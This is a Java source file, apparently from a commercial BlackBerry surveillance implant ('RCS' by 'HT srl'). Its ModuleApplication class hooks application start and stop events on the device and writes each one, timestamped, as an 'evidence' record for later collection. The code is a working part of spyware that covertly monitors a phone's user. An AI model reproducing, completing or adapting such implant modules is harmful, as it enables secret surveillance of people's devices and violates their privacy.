//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ApplicationAgent.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry.module;

import java.util.Vector;

import blackberry.AppListener;
import blackberry.config.ConfModule;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.interfaces.ApplicationObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * log dei start e stop delle applicazioni.
 */
public final class ModuleApplication extends BaseModule implements
        ApplicationObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ApplicationAgent",
            DebugLevel.VERBOSE);
    private Evidence evidence;

    //#endif

    public boolean parse(ConfModule conf) {
        return true;
    }

    public void actualGo() {

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart addApplicationListObserver");
        //#endif
        evidence = new Evidence(EvidenceType.APPLICATION);
        status.applicationAgentFirstRun = true;
        AppListener.getInstance().addApplicationObserver(this);
        
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop removeApplicationListObserver");
        //#endif
        AppListener.getInstance().removeApplicationObserver(this);

    }

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {

        //#ifdef DEBUG
        debug.trace("onApplicationChange START: " + startedName + " "
                + startedMod);
        debug.trace("onApplicationChange STOP: " + stoppedName + " "
                + stoppedMod);
        //#endif

        if (stoppedName != null) {
            writeEvidence(stoppedName, "STOP ", stoppedMod);
        }

        writeEvidence(startedName, "START", startedMod);
    }

    public synchronized void onApplicationListChangeMod(
            final Vector startedList, final Vector stoppedList) {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        debug.trace("parse");
        //#endif

        //#ifdef DEBUG
        //StringBuffer sb = new StringBuffer();
        //debug.info(sb.toString());
        //#endif

        return false;
    }

    private synchronized void writeEvidence(final String appName,
            final String condition, final String mod) {

        //#ifdef DBC
        Check.requires(appName != null, "Null appName");
        Check.requires(mod != null, "Null mod");
        //#endif

        final byte[] tm = (new DateTime()).getStructTm();

        final Vector items = new Vector();
        items.addElement(tm);
        items.addElement(WChar.getBytes(appName, true));
        items.addElement(WChar.getBytes(condition, true));
        items.addElement(WChar.getBytes(mod, true));
        items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));

        
        evidence.atomicWriteOnce(items);

    }

}
